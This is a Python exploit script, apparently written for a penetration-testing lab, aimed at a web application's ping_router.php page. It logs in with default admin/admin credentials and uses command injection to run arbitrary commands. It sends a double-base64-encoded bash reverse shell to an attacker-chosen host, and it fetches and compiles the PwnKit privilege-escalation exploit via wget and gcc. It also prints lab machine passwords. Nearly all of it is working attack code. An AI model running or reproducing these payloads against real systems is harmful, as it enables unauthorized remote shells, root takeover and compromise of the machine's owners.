import requests
import lxml.html
import re
import os
import subprocess


from requests.auth import HTTPBasicAuth

session = requests.Session()
#session.auth = ("admin", "admin")

login_endpoint = "http://10.1.1.95:4080/check_login.php"
rce_endpoint = "http://10.1.1.95:4080/ping_router.php?cmd=;"
droplet_ip = "192.168.119.136"

def authenticate() -> bool:
    credentials = {
        "txtUsername": "admin",
        "txtPassword": "admin",
        "Submit":"Login"
        }
    
    response = session.post(login_endpoint, data = credentials)

    if (response.status_code == 200) :
        return True

    return False


def show_command_output(command) -> None:
    response = session.get(rce_endpoint + command)
    document = lxml.html.fromstring(response.content)
    elements = document.xpath("//table/td/text()")

    output = elements[0].split('\n')
    output = output[1:len(output)-2]

    for line in output:
        line = line.replace('\t', '')
        print(line)

def encode_reverse_shell(lhost, lport) -> str:
    encoded = subprocess.getoutput("echo \"bash -i >& /dev/tcp/{}/{} 0>&1\" | base64 | base64".format(lhost, lport))
    return encoded

def spawn_shell() -> None:
    lhost = input("\tLHOST:")
    lport = input("\tLPORT:")
    reverse_shell = encode_reverse_shell(lhost, lport)

    print("\tThis is your reverse shell: {}\n".format(reverse_shell))
    print("\tGo to SEAN machine 10.11.1.251 and start a netcat listener, password for sean user is monkey and same for root")

    input("\tPress any key when you are ready")

    payload = "echo {} > a;base64 -d a > a2;base64 -d a2 > a3;bash a3".format(reverse_shell)
    print("\tConstructed payload: {}".format(payload))

    session.get(rce_endpoint + payload)
    print("vlizam")

def transfer_pwnkit(server_ip, server_port) -> None:
    local_filename = "PwnKit.c"

    server_endpoint = "http://{}:{}".format(server_ip, server_port)

    command = "wget {}{}".format(server_endpoint, local_filename)
    session.get(rce_endpoint + command)

    command = "gcc PwnKit.c -o r; chmod +x r"
    session.get(rce_endpoint + command)

def main() -> int:
    print("Select: \n1.Execute a single command\n2.Spawn a root shell\n3.Transfer PwnKit for EoP")
    choice = int(input("-> "))

    authenticate()
    if(choice == 1) :
        show_command_output(command = input("Execute command: "))
    elif (choice == 2):
        spawn_shell()
    elif (choice == 3):
        print("\tStart a server in order to transfer PwnKit exploit")
        server_ip = input("\t SRVHOST: ")
        server_port = input("\t SRVPORT: ")
        transfer_pwnkit(server_ip, server_port)
        print("Spawn a shell and execute binary called r")
    else:
        return -1
        

if __name__ == "__main__":
    main()
